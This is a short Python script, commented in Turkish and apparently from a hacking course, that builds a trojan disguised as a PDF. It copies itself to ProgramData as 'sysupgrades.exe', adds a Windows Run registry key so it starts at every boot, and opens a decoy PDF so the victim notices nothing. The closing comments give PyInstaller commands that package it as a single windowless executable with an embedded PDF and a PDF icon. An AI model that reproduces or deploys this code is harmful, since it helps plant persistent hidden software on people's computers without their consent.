import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
	#persistence
	# yeni dosya olusturmak icin appdata nin yerini ogrenip dosyamize sysupg adini verdik.
	# appdata klasorunu al icerisine sysupgrade adinda dosya olustur
	new_file = os.environ["ProgramData"] + "\\sysupgrades.exe"
	# bu dosyanin olup olmadigini kontrol edelim ki her defasinda kayit etmesin
	if not os.path.exists(new_file):	
		# simdi olusan dosya yolunu kullanarak icinde bulundugumuz exe(executable) yi oraya(appdata-->new_file) kaydedelim
		shutil.copyfile(sys.executable,new_file)
		# yeni olusturdugumuz dosyayi regefit e ekleyelim
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		# bilgisayar her acildiginda program calissin 
		subprocess.call(regedit_command, shell=True)
add_to_registry()

def open_added_file():
	# program acilinca datayi kullaniciya gostermesi gerek fonk yazalim
	added_file = sys._MEIPASS + "\\sex.pdf"
	# popen dosyalari arka planda acmaya yarar
	subprocess.Popen(added_file, shell=True)
open_added_file()

x = 0
while x < 100:
	print("I hacked you !")
	x += 1
	time.sleep(0.5)
# shell calistirma komutu--> C:\Python37\Scripts\pyinstaller.exe 39-MyPackage.py --onefile
# pdf ekleme--> C:\Python37\Scripts\pyinstaller.exe 39-MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\sex.pdf;.""
# icon,pdf ekli halde --> C:\Python37\Scripts\pyinstaller.exe 39-MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\sex.pdf;."
# --noconsole --icon C:\Users\IEUser\Desktop\pdf.ico
# my_check = subprocess.checkoutput("command",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
